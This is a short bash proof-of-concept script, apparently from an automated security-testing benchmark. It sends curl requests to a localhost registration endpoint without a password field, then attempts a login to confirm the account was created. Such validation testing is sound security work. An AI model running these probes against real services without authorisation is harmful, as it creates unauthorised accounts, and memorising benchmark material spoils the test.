#!/bin/bash
# POC: Demonstrates weak input validation in registration endpoint by creating an account without a password field
# Target: ./repo
# Created: 2025-12-01T16:04:24.408Z
# Session: benchmark-XBEN-069-24-minbd4jr

# Weak Input Validation - Missing Password Field in Registration
# This POC demonstrates that the registration endpoint accepts requests
# without the required password field and successfully creates accounts

TARGET_URL="http://localhost:8080/api/register.php"
TIMESTAMP=$(date +%s)
USERNAME="nopass_user_${TIMESTAMP}"
EMAIL="nopass_${TIMESTAMP}@test.com"

echo "=========================================="
echo "Weak Input Validation POC - Missing Password"
echo "=========================================="
echo ""
echo "[*] Target: $TARGET_URL"
echo "[*] Testing: Registration without password field"
echo "[*] Username: $USERNAME"
echo "[*] Email: $EMAIL"
echo ""

# Test 1: Register without password field (vulnerable behavior)
echo "[TEST 1] Attempt to register WITHOUT password field..."
echo ""
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d "username=${USERNAME}&email=${EMAIL}")

echo "Response: $RESPONSE"
echo ""

# Check if registration was successful (should fail but succeeds)
if echo "$RESPONSE" | grep -q "success.*true\|Registration successful"; then
    echo "[!] VULNERABILITY CONFIRMED: Account created without password!"
    echo "[!] The registration endpoint accepted the request and created the account."
    echo "[!] This is a critical input validation weakness."
    echo ""
    
    # Test 2: Verify the account was actually created by attempting login
    echo "[TEST 2] Attempting to login with the account (to verify it exists)..."
    echo ""
    
    LOGIN_RESPONSE=$(curl -s -X POST "http://localhost:8080/api/login.php" \
      -H 'Content-Type: application/x-www-form-urlencoded' \
      -d "username=${USERNAME}&password=anypassword")
    
    echo "Login Response: $LOGIN_RESPONSE"
    echo ""
    
    if echo "$LOGIN_RESPONSE" | grep -q "Invalid credentials\|login failed\|error"; then
        echo "[!] Account exists but cannot be accessed with any password"
        echo "[!] This confirms the account was created without a password set"
        exit 0
    fi
else
    echo "[X] Unexpected response - vulnerability may not be present"
    echo ""
    exit 1
fi